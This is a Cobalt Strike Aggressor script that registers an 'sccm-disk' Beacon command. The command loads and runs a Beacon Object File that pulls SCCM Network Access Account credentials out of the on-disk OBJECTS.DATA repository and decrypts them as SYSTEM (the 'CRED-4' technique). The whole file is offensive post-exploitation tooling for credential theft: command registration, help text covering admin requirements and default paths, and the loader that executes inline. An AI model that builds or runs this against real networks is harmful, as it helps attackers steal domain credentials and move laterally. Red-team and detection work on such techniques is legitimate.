#
# sccm-disk BOF - SCCM CRED-4 on-disk OBJECTS.DATA triage
#
# Parses OBJECTS.DATA for CCM_NetworkAccessAccount and decrypts the NAA
# PolicySecret blobs locally as SYSTEM.
#

beacon_command_register(
    "sccm-disk",
    "Recover SCCM NAA creds from on-disk OBJECTS.DATA (CRED-4)",
    "Synopsis: sccm-disk [PATH]\n\n" .
    "Parse the SCCM CIM repository (OBJECTS.DATA) for CCM_NetworkAccessAccount\n" .
    "and decrypt the NetworkAccessUsername/NetworkAccessPassword PolicySecret\n" .
    "blobs locally with CryptUnprotectData, impersonating SYSTEM.\n\n" .
    "Arguments:\n" .
    "  [PATH]              Optional OBJECTS.DATA path (default:\n" .
    "                      C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA)\n\n" .
    "Examples:\n" .
    "  sccm-disk\n" .
    "  sccm-disk C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA\n\n" .
    "Notes:\n" .
    "  - Requires a high-integrity (admin) context\n" .
    "  - Runs local CryptUnprotectData as SYSTEM after token impersonation\n" .
    "  - For live WMI policy recovery, use sccm-wmi (CRED-3) instead\n"
);

sub _read_bof_resource {
    local('$bid $arch $rel $abs $h $bytes');
    $bid  = $1;
    $arch = barch($bid);
    $rel  = "sccm-disk." . $arch . ".o";
    $abs  = script_resource($rel);
    if ($abs is $null) { berror($bid, "missing resource: " . $rel); return $null; }
    $h = openf($abs);
    if ($h is $null) { berror($bid, "open failed: " . $abs); return $null; }
    $bytes = readb($h, -1);
    closef($h);
    return $bytes;
}

alias sccm-disk {
    local('$bof $args $path');

    $path = (size(@_) >= 2) ? @_[1] : "";

    $bof = _read_bof_resource($1);
    if (isnull($bof) || strlen($bof) == 0) { berror($1, "empty BOF"); return; }
    btask($1, "Running SCCM CRED-4 BOF (disk)");

    if (strlen($path) > 0) {
        # Pack arguments: z (target path)
        $args = bof_pack($1, "z", $path);
    } else {
        $args = $null;   # default OBJECTS.DATA location
    }

    beacon_inline_execute($1, $bof, "go", $args);
}
